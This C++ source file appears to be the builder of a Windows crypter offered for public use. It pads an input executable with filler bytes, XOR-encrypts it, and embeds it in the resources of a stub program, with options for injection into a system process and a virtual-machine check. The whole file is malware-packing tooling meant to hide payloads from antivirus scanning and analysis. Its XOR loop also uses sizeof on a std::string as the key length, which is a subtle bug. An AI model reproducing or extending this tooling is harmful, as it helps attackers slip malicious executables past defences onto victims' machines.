#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include "../../Key.h"

using namespace std;

void WriteResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

void XORCrypt(const string& key, vector<unsigned char>& bytes)
{
	for (int i = 0; i < bytes.size(); ++i)
		bytes[i] ^= key[i % sizeof(key)];
}

int main()
{
	setlocale(LC_ALL, "Russian");
	string input_file, output_file;

	cout << "Эта программа была создана @atyonekilla для публичного использования: \n";	
	cout << "This program was create public using, please don`t delete author @atyonekilla: \n";	
	Sleep(4000); system("cls");	Sleep(1000);
	//Main Functions
	cout << "Enter the name of the input file: / Введите имя входного файла: ";
	cin >> input_file;
	cout << endl << "Enter the name of the output file: / Введите имя выходного файла: ";
	cin >> output_file;

	CopyFile("Stub.exe", output_file.c_str(), FALSE);
	// До этой строчки мы получили все необходимые данные для создаения стаба (остальное потом)
	
	vector<unsigned char> file_bytes, settings;

	HANDLE hFile = CreateFile(input_file.c_str(), GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD file_size = GetFileSize(hFile, NULL), bytes;
	file_bytes.resize(file_size);
	ReadFile(hFile, (LPVOID)(file_bytes.data()), file_size, &bytes, NULL);
	CloseHandle(hFile);

	if (file_size != bytes)
	{
		MessageBox(0, "Problems with the file! / Проблемы с файлом!", "", 0);
		return 0;
	}

	int pump_factor;
	cout << "Add weight (enter 0 if not): / Накинуть вес (ввести 0 - если нет): ";
	cin >> pump_factor;

	for (int i = 0; i < pump_factor * 1000; ++i)
		file_bytes.push_back('0');

	XORCrypt(key, file_bytes);

	int bInject, bCheckVm;
	cout << "Do I need an injection into the system process?: / Нужен ли инжект в системный процесс: ";
	cin >> bInject;

	if (bInject == 1)
		settings.push_back('1');
	else
		settings.push_back('0');
	
	cout << endl << "Do I need to check for a VM: / Нужна ли проверка на виртуальную машину: ";
	cin >> bCheckVm;

	if (bCheckVm == 1)
		settings.push_back('1');
	else
		settings.push_back('0');

	char* output = (char*)(output_file.c_str());
	WriteResources(output, 1, (BYTE*)settings.data(), settings.size());

	WriteResources(output, 2, (BYTE*)file_bytes.data(), file_bytes.size());

	system("pause");
}